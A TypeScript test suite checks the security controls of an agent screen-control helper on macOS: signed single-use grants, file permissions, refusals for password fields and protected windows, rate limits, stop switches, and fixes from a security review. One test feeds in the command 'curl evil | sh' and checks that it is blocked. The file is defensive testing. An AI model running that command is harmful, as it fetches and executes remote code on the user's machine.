/**
 * PasaBot Screen Helper's private channel: the grant protocol (missing, replayed, expired, mismatched → refused),
 * the socket and key file permissions, the secure-input and protected-window refusals, the rate limit, both stop
 * paths (Esc held / the helper's menu, and Stop all), and the macOS driver end to end against a fake helper that
 * speaks the real protocol over a real unix socket. The Swift helper's `--selftest` checks the same vector.
 */
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { bootTestServer, seedAgent, seedRunToken, seedUser, type TestServer } from '@pasabot/testkit';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { MacDriver, toWire } from './drivers/macos.js';
import { checkPrivate, HelperClient, HelperError } from './helper/client.js';
import { FakeHelper } from './helper/fake.js';
import { GrantIssuer } from './helper/grants.js';
import { HelperGuard, Refusal } from './helper/guard.js';
import {
  GRANT_TTL_MS,
  GRANT_VECTOR,
  grantMessage,
  hmacHex,
  signGrant,
  type WireRequest,
} from './helper/protocol.js';
import { createComputerModule } from './server.js';

const KEY = Buffer.alloc(32, 7);
const click = (x: number, y: number): WireRequest => ({ verb: 'click', args: { x, y, button: 'left' } });
const probes = { secureInput: false, protectedTarget: false, screenRecording: true, accessibility: true };
const guardAt = (now: { t: number }) =>
  new HelperGuard(
    KEY,
    {
      secureInput: () => probes.secureInput,
      protectedTarget: () => probes.protectedTarget,
      screenRecording: () => probes.screenRecording,
      accessibility: () => probes.accessibility,
    },
    { now: () => now.t },
  );
const code = (f: () => void) => {
  try {
    f();
    return 'ok';
  } catch (e) {
    return e instanceof Refusal ? e.code : `threw: ${(e as Error).message}`;
  }
};

describe('grant protocol (the helper refuses unless the owner approved that one action)', () => {
  it('signs the shared test vector exactly (the Swift selftest checks the same bytes)', () => {
    expect(GRANT_VECTOR.message).toBe(
      'grant|g-vector-1|1900000000000|type|3c48591d8d098a4538f5e013dfcf406e948eac4d3277b10bf614e295d6068179',
    );
    expect(GRANT_VECTOR.mac).toBe('bd84e71ac3bdebd09753e6219876d15158e7777aa516949b4c4770aac5377a4c');
  });

  it('no grant → refused; a valid one works once; replayed → refused', () => {
    const now = { t: 1_000_000 };
    const g = guardAt(now);
    expect(code(() => g.check(click(5, 5), undefined))).toBe('grant_missing');
    expect(code(() => g.check(click(5, 5), null))).toBe('grant_missing');
    const grant = signGrant(KEY, 'g-0123456789', now.t + GRANT_TTL_MS, click(5, 5));
    expect(code(() => g.check(click(5, 5), grant))).toBe('ok');
    expect(code(() => g.check(click(5, 5), grant))).toBe('grant_replayed');
  });

  it('expired → refused; too far ahead → refused; for another action or key → refused', () => {
    const now = { t: 1_000_000 };
    const g = guardAt(now);
    const old = signGrant(KEY, 'g-expired-01', now.t + 10, click(5, 5));
    now.t += 11;
    expect(code(() => g.check(click(5, 5), old))).toBe('grant_expired');
    expect(
      code(() => g.check(click(5, 5), signGrant(KEY, 'g-ahead-0001', now.t + 61_000, click(5, 5)))),
    ).toBe('grant_invalid');
    // a grant for (5, 5) never moves the pointer to (6, 5); a typed text is bound by its hash
    const g55 = signGrant(KEY, 'g-other-0001', now.t + 1000, click(5, 5));
    expect(code(() => g.check(click(6, 5), g55))).toBe('grant_invalid');
    const typeA = signGrant(KEY, 'g-type-00001', now.t + 1000, { verb: 'type', args: { text: 'hello' } });
    expect(code(() => g.check({ verb: 'type', args: { text: 'hellp' } }, typeA))).toBe('grant_invalid');
    const wrongKey = signGrant(Buffer.alloc(32, 8), 'g-wrongkey01', now.t + 1000, click(5, 5));
    expect(code(() => g.check(click(5, 5), wrongKey))).toBe('grant_invalid');
    expect(
      code(() => g.check(click(5, 5), { id: 'g-badmac-001', exp: now.t + 1000, mac: 'ab'.repeat(32) })),
    ).toBe('grant_invalid');
    // an unknown verb is never run, signed or not
    const odd = { verb: 'shell', args: {} } as unknown as WireRequest;
    expect(
      code(() =>
        g.check(odd, {
          id: 'g-odd-000001',
          exp: now.t + 1000,
          mac: hmacHex(KEY, grantMessage('g-odd-000001', now.t + 1000, odd)),
        }),
      ),
    ).toBe('bad_request');
  });

  it('a password box has the keyboard → typing refused (clicks still allowed); a protected window → refused', () => {
    const now = { t: 1_000_000 };
    const g = guardAt(now);
    let n = 0;
    const ok = (r: WireRequest) =>
      code(() => g.check(r, signGrant(KEY, `g-secure-${n++}xx`, now.t + 1000, r)));
    probes.secureInput = true;
    try {
      expect(ok({ verb: 'type', args: { text: 'hunter2' } })).toBe('secure_input');
      expect(ok({ verb: 'key', args: { keys: 'Return' } })).toBe('secure_input');
      expect(ok(click(1, 1))).toBe('ok');
    } finally {
      probes.secureInput = false;
    }
    probes.protectedTarget = true;
    try {
      expect(ok(click(1, 1))).toBe('protected_window');
      expect(ok({ verb: 'screenshot', args: {} })).toBe('ok');
    } finally {
      probes.protectedTarget = false;
    }
    probes.accessibility = false;
    try {
      expect(ok(click(1, 1))).toBe('no_accessibility');
    } finally {
      probes.accessibility = true;
    }
  });

  it('rate limit: more than 8 input actions in 2 s are refused; a stop holds until a granted resume', () => {
    const now = { t: 1_000_000 };
    const g = guardAt(now);
    let n = 0;
    const ok = (r: WireRequest) =>
      code(() => g.check(r, signGrant(KEY, `g-rate-${n++}xxxx`, now.t + 1000, r)));
    for (let i = 0; i < 8; i++) expect(ok(click(1, 1))).toBe('ok');
    expect(ok(click(1, 1))).toBe('rate_limited');
    now.t += 2001;
    expect(ok(click(1, 1))).toBe('ok');
    g.stop();
    expect(ok(click(1, 1))).toBe('stopped');
    expect(ok({ verb: 'screenshot', args: {} })).toBe('stopped');
    expect(code(() => g.check({ verb: 'resume', args: {} }, undefined))).toBe('grant_missing');
    expect(ok({ verb: 'resume', args: {} })).toBe('ok');
    expect(ok(click(1, 1))).toBe('ok');
  });
});

describe('private socket and key file', () => {
  let dir: string;
  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), 'pb-perm-'));
  });
  afterAll(() => rmSync(dir, { recursive: true, force: true }));

  it('refuses a key file, socket or folder that other users could open', async () => {
    const run = join(dir, 'run');
    mkdirSync(run, { mode: 0o700 });
    const key = join(run, 'screen.key');
    writeFileSync(key, 'ab'.repeat(32), { mode: 0o644 });
    expect(() => checkPrivate(key, 'file')).toThrow(/other users/);
    chmodSync(key, 0o600);
    expect(() => checkPrivate(key, 'file')).not.toThrow();
    expect(() => checkPrivate(key, 'socket')).toThrow(/not a socket/);
    chmodSync(run, 0o755);
    expect(() => checkPrivate(run, 'dir')).toThrow(/other users/);
    chmodSync(run, 0o700);
    // a socket left world-writable is refused before any connection is made
    const sock = join(run, 'screen.sock');
    const srv = createServer(() => {});
    await new Promise<void>((r) => srv.listen(sock, () => r()));
    try {
      chmodSync(sock, 0o666);
      const c = new HelperClient({ socketPath: sock, keyPath: key });
      await expect(c.status()).rejects.toMatchObject({ code: 'unsafe_files' });
      expect(() => new GrantIssuer(join(run, 'missing.key')).issue(click(1, 1))).toThrow(HelperError);
    } finally {
      await new Promise<void>((r) => srv.close(() => r()));
    }
  });

  it('the fake helper makes its socket 0600 in a 0700 folder; a client with the wrong key is shut out', async () => {
    const fake = new FakeHelper({ dir: join(dir, 'ok') });
    await fake.start();
    try {
      expect(() => checkPrivate(fake.paths.socket, 'socket')).not.toThrow();
      expect(() => checkPrivate(fake.paths.dir, 'dir')).not.toThrow();
      const good = new HelperClient({ socketPath: fake.paths.socket, keyPath: fake.paths.key });
      expect(await good.status()).toMatchObject({
        screenRecording: false,
        accessibility: false,
        stopped: false,
      });
      good.close();
      const otherKey = join(dir, 'other.key');
      writeFileSync(otherKey, 'cd'.repeat(32), { mode: 0o600 });
      const bad = new HelperClient({ socketPath: fake.paths.socket, keyPath: otherKey });
      await expect(bad.status()).rejects.toMatchObject({ code: 'auth_failed' });
      // even with the right key, a request with no grant (or a forged one) is refused by the helper itself
      fake.perms.screenRecording = true;
      const c = new HelperClient({ socketPath: fake.paths.socket, keyPath: fake.paths.key });
      await expect(
        c.request(
          { verb: 'screenshot', args: {} },
          { id: 'g-forged-0001', exp: Date.now() + 1000, mac: '00'.repeat(32) },
        ),
      ).rejects.toMatchObject({ code: 'grant_invalid' });
      const g = new GrantIssuer(fake.paths.key).issue({ verb: 'screenshot', args: {} });
      await expect(c.request({ verb: 'screenshot', args: {} }, g)).resolves.toMatchObject({
        ok: true,
        width: 640,
      });
      await expect(c.request({ verb: 'screenshot', args: {} }, g)).rejects.toMatchObject({
        code: 'grant_replayed',
      });
      c.close();
    } finally {
      await fake.close();
    }
  });
});

describe('MacDriver against the fake helper', () => {
  it('needs a grant for every call and turns refusals into plain words', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'pb-drv-'));
    const fake = new FakeHelper({
      dir: join(dir, 'run'),
      permissions: { screenRecording: true, accessibility: true },
    });
    await fake.start();
    const client = new HelperClient({ socketPath: fake.paths.socket, keyPath: fake.paths.key });
    const issuer = new GrantIssuer(fake.paths.key);
    const auth = (r: WireRequest) => issuer.issue(r);
    try {
      const d = new MacDriver({ client });
      await expect(d.start()).rejects.toThrow(/no approval/);
      await d.start(auth);
      expect(d.display()).toEqual({ width: 640, height: 400, scale: 1 });
      await expect(d.act({ kind: 'click', x: 300, y: 170 })).rejects.toThrow(/no approval/);
      expect(fake.screen.app.presses).toBe(0);
      await d.act({ kind: 'click', x: 300, y: 170 }, auth);
      expect(fake.screen.app.presses).toBe(1);
      fake.secureInput = true;
      await expect(d.act({ kind: 'type', text: 'secret' }, auth)).rejects.toThrow(/password box/);
      expect(fake.screen.app.typed).toBe('');
      fake.secureInput = false;
      fake.protectedTarget = true;
      await expect(d.act({ kind: 'click', x: 1, y: 1 }, auth)).rejects.toThrow(/protected window/);
      fake.protectedTarget = false;
      expect(toWire({ kind: 'key', keys: 'cmd+c Return' })).toEqual({
        verb: 'key',
        args: { keys: 'cmd+c Return' },
      });
      expect((await d.screenshot(auth)).length).toBeGreaterThan(100);
    } finally {
      client.close();
      await fake.close();
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('the computer module with the macOS driver and a fake Screen Helper', () => {
  let s: TestServer;
  let dir: string;
  let fake: FakeHelper;
  let owner: string;
  let tala: string;
  let ligaya: string;
  const api = (path: string, init: RequestInit = {}, token = owner) =>
    fetch(`${s.url}/api/m/computer${path}`, {
      ...init,
      headers: {
        ...(init.body ? { 'content-type': 'application/json' } : {}),
        authorization: `Bearer ${token}`,
      },
    });
  const rpc = async (bearer: string, name: string, args: unknown) => {
    const r = await fetch(`${s.url}/mcp`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', authorization: `Bearer ${bearer}` },
      body: JSON.stringify({
        jsonrpc: '2.0',
        id: 1,
        method: 'tools/call',
        params: { name, arguments: args },
      }),
    });
    const j = (await r.json()) as { result: { content: { text: string }[]; isError?: boolean } };
    const text = j.result.content[0]!.text;
    return j.result.isError ? { error: text } : (JSON.parse(text) as Record<string, unknown>);
  };
  const ownerTurn = (agentId: string) => {
    const { token, runId } = seedRunToken(s.db, agentId);
    s.db
      .prepare('UPDATE queue_items SET source = ? WHERE id = (SELECT queue_item_id FROM runs WHERE id = ?)')
      .run(JSON.stringify({ sender: { id: 'x', name: 'Owner', kind: 'owner', trust: 'trusted' } }), runId);
    return token;
  };
  const approveNext = async (agentId: string, decision: 'approved' | 'denied' = 'approved') => {
    let row: { id: string } | undefined;
    for (let i = 0; i < 200 && !row; i++) {
      row = s.db
        .prepare("SELECT id FROM approvals WHERE agent_id = ? AND state = 'pending'")
        .get(agentId) as typeof row;
      if (!row) await new Promise((r) => setTimeout(r, 20));
    }
    if (!row) throw new Error('no approval was asked');
    s.approvals.decide(row.id, decision, 'owner');
  };

  beforeAll(async () => {
    dir = mkdtempSync(join(tmpdir(), 'pb-mod-'));
    fake = new FakeHelper({ dir: join(dir, 'run'), autoGrantMs: 50 });
    await fake.start();
    s = await bootTestServer({
      modules: [createComputerModule({ driver: 'macos', helperDir: fake.paths.dir })],
    });
    const setup = await fetch(`${s.url}/api/v1/setup`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        token: s.auth.issueSetupToken(),
        displayName: 'Owner',
        password: 'a-long-owner-password',
      }),
    });
    owner = ((await setup.json()) as { token: string }).token;
    tala = seedAgent(s.db, { trust: 'trusted', slug: 'tala' });
    ligaya = seedAgent(s.db, { trust: 'trusted', slug: 'ligaya' });
    mkdirSync(join(dir, 'ws-tala'));
    s.db.prepare('UPDATE agents SET workspace_dir = ? WHERE id = ?').run(join(dir, 'ws-tala'), tala);
  });
  afterAll(async () => {
    await s.cleanup();
    await fake.close();
    rmSync(dir, { recursive: true, force: true });
  });

  it('setup: the helper status ticks turn on as the owner opens each pane; nothing is granted to the server', async () => {
    const st = async () =>
      ((await (await api('/helper')).json()) as { helper: Record<string, unknown> }).helper;
    expect(await st()).toMatchObject({ running: true, screenRecording: false, accessibility: false });
    expect((await api('/helper/open', { method: 'POST', body: '{"pane":"screen"}' })).status).toBe(200);
    expect((await api('/helper/open', { method: 'POST', body: '{"pane":"accessibility"}' })).status).toBe(
      200,
    );
    expect((await api('/helper/open', { method: 'POST', body: '{"pane":"keychain"}' })).status).toBe(400);
    expect(fake.opened).toEqual([
      'x-apple.systempreferences:com.apple.preference.security?Privacy_ScreenCapture',
      'x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility',
    ]);
    await expect.poll(st).toMatchObject({ screenRecording: true, accessibility: true });
  });

  it('an agent that is not turned on is refused before any approval; once on, each action needs its own yes', async () => {
    const tok = ownerTurn(tala);
    expect((await rpc(tok, 'computer_click', { x: 300, y: 170 })).error).toMatch(/off for you/);
    expect(fake.log.filter((l) => l.verb === 'click')).toEqual([]);
    expect((await api(`/macos/${tala}`, { method: 'PUT', body: '{"enabled":true}' })).status).toBe(200);
    // "Try it": the owner's own harmless screenshot
    const tried = await api(`/try/${tala}`, { method: 'POST' });
    expect(await tried.json()).toMatchObject({ ok: true, width: 640, height: 400 });
    expect((await api(`/displays/${tala}/preview`)).headers.get('content-type')).toBe('image/png');
    // a denied click never reaches the helper
    const denied = rpc(tok, 'computer_click', { x: 300, y: 170 });
    await approveNext(tala, 'denied');
    expect((await denied).error).toBeDefined();
    expect(fake.screen.app.presses).toBe(0);
    const ok = rpc(tok, 'computer_click', { x: 300, y: 170 });
    await approveNext(tala);
    expect(await ok).toMatchObject({ ok: true });
    expect(fake.screen.app.presses).toBe(1);
    const typed = rpc(tok, 'computer_type', { text: 'hello there' });
    await approveNext(tala);
    expect(await typed).toMatchObject({ ok: true });
    const rows = s.db.prepare("SELECT detail FROM computer_action WHERE kind = 'type'").all() as {
      detail: string;
    }[];
    expect(rows.map((r) => r.detail)).toEqual(['type (11 characters)']);
    // the helper refuses a password box: the agent is told to hand over
    fake.secureInput = true;
    const secret = rpc(tok, 'computer_type', { text: 'hunter2' });
    await approveNext(tala);
    expect((await secret).error).toMatch(/password box/);
    fake.secureInput = false;
    // every grant the server sent was fresh and used once
    expect(fake.log.filter((l) => l.code === 'grant_replayed' || l.code === 'grant_missing')).toEqual([]);
  });

  // security review 2026-11-15: a helper's click could press Approve on another card in the owner's own window
  it('a computer card is a screen card only the owner app answers; a helper click marks the screen as in use', async () => {
    const tok = ownerTurn(tala);
    const clicked = rpc(tok, 'computer_click', { x: 300, y: 170 });
    let row: { id: string } | undefined;
    for (let i = 0; i < 200 && !row; i++) {
      row = s.db
        .prepare("SELECT id FROM approvals WHERE agent_id = ? AND state = 'pending' AND screen = 1")
        .get(tala) as typeof row;
      if (!row) await new Promise((r) => setTimeout(r, 20));
    }
    expect(row).toBeDefined();
    expect(s.approvals.get(row!.id)).toMatchObject({ screen: true, tier: 3 });
    // a module, channel or automation never approves it, and what modules read carries no nonce
    expect(s.approvals.forModules().decide(row!.id, 'approved', 'owner')).toBeNull();
    expect(s.approvals.forModules().get(row!.id)?.nonce).toBeUndefined();
    s.approvals.decide(row!.id, 'approved', 'owner');
    expect(await clicked).toMatchObject({ ok: true });
    // the click's grant: for 30 s sensitive cards need a fresh re-auth; for 2 s no approval goes through at all
    expect(s.approvals.screenActive()).toBe(true);
    expect(s.approvals.screenBusy()).toBe(true);
    expect(s.approvals.screenBusy(Date.now() + 2_100)).toBe(false);
    expect(s.approvals.screenActive(Date.now() + 31_000)).toBe(false);
  });

  // security review 2026-11-15 (medium): the card's picture was the last frame even after the screen changed
  it('after an action the approval card shows no picture until a new screenshot (never a dot on an old screen)', async () => {
    const tok = ownerTurn(tala);
    const shot = rpc(tok, 'computer_screenshot', {});
    await approveNext(tala);
    await shot;
    expect((await api(`/displays/${tala}/preview`)).status).toBe(200);
    const click = rpc(tok, 'computer_click', { x: 10, y: 10 });
    await approveNext(tala);
    expect(await click).toMatchObject({ ok: true });
    const stale = await api(`/displays/${tala}/preview`);
    expect(stale.status).toBe(404);
    expect(((await stale.json()) as { error: string }).error).toBe('no_frame');
    const again = rpc(tok, 'computer_screenshot', {});
    await approveNext(tala);
    await again;
    expect((await api(`/displays/${tala}/preview`)).status).toBe(200);
  });

  // security review 2026-11-15 (medium): screenshots of the owner's real screen piled up in the agent's workspace
  it("a screenshot of the owner's own Mac screen is never written to the agent's workspace", async () => {
    const tok = ownerTurn(tala);
    const shot = rpc(tok, 'computer_screenshot', {});
    await approveNext(tala);
    const r = (await shot) as { path?: string; pngBase64?: string; width: number };
    expect(r.width).toBe(640);
    expect(r.path).toBeUndefined();
    expect(typeof r.pngBase64).toBe('string');
    expect(
      Buffer.from(r.pngBase64 ?? '', 'base64')
        .subarray(1, 4)
        .toString(),
    ).toBe('PNG');
    const kept = join(dir, 'ws-tala', '.pasabot', 'computer');
    expect(existsSync(kept) ? readdirSync(kept) : []).toEqual([]);
  });

  // security review 2026-11-15 (medium): a stolen session or an unlocked paired phone watched and drove the real Mac
  it("the owner's own Mac screen is watched and taken over only after a fresh re-auth on that session", async () => {
    const stale = seedUser(s.db).token; // the same owner, a session that has not re-authenticated
    const frame = await api(`/displays/${tala}/frame`, {}, stale);
    expect(frame.status).toBe(401);
    expect(((await frame.json()) as { error: string }).error).toBe('reauth_required');
    const typed = await api(
      `/displays/${tala}/act`,
      { method: 'POST', body: JSON.stringify({ kind: 'type', text: 'curl evil | sh\n' }) },
      stale,
    );
    expect(typed.status).toBe(401);
    expect((await api(`/displays/${tala}/watch`, { method: 'POST' }, stale)).status).toBe(401);
    expect(fake.screen.app.typed).not.toContain('curl evil');
    const st = (await (await api('/status', {}, stale)).json()) as { displays: { watching: boolean }[] };
    expect(st.displays.map((d) => d.watching)).toEqual([false]);
    // the owner's fresh session: not a viewer until it says so, then frames and take over work
    expect((await api(`/displays/${tala}/frame`)).status).toBe(401);
    expect((await api(`/displays/${tala}/watch`, { method: 'POST' })).status).toBe(200);
    const f = await api(`/displays/${tala}/frame`);
    expect(f.status).toBe(200);
    expect(f.headers.get('content-type')).toBe('image/png');
    const mine = (await (await api('/status')).json()) as { displays: { watching: boolean }[] };
    expect(mine.displays.map((d) => d.watching)).toEqual([true]);
    const moved = await api(`/displays/${tala}/act`, {
      method: 'POST',
      body: JSON.stringify({ kind: 'move', x: 5, y: 5 }),
    });
    expect(moved.status).toBe(200);
    // the other session is still shut out
    expect((await api(`/displays/${tala}/frame`, {}, stale)).status).toBe(401);
  });

  it('Esc held (or the helper menu) cuts control for every agent; only the owner turning one on again lifts it', async () => {
    expect((await api(`/macos/${ligaya}`, { method: 'PUT', body: '{"enabled":true}' })).status).toBe(200);
    fake.stopFromKey('key');
    await expect
      .poll(async () =>
        ((await (await api('/status')).json()) as { macosAgents: { enabled: boolean }[] }).macosAgents.map(
          (a) => a.enabled,
        ),
      )
      .toEqual([false, false]);
    const tok = ownerTurn(tala);
    expect((await rpc(tok, 'computer_click', { x: 1, y: 1 })).error).toMatch(/off for you/);
    expect(fake.stopped).toBe(true);
    expect((await api(`/macos/${tala}`, { method: 'PUT', body: '{"enabled":true}' })).status).toBe(200);
    await expect.poll(() => fake.stopped).toBe(false);
  });

  it('Stop all tells the helper to stop at once and closes the display', async () => {
    // the tests above took several pictures: let the helper's 2-second rate window pass
    await new Promise((r) => setTimeout(r, 2100));
    const tok = ownerTurn(tala);
    const shot = rpc(tok, 'computer_screenshot', {});
    await approveNext(tala);
    expect(await shot).toMatchObject({ width: 640 });
    expect(((await (await api('/status')).json()) as { displays: unknown[] }).displays).toHaveLength(1);
    await s.killSwitch.stopAll({ kind: 'owner', userId: 'owner' }, 'test');
    expect(fake.stopped).toBe(true);
    expect(((await (await api('/status')).json()) as { displays: unknown[] }).displays).toHaveLength(0);
    expect((await api(`/try/${tala}`, { method: 'POST' })).status).toBe(409);
  });
});
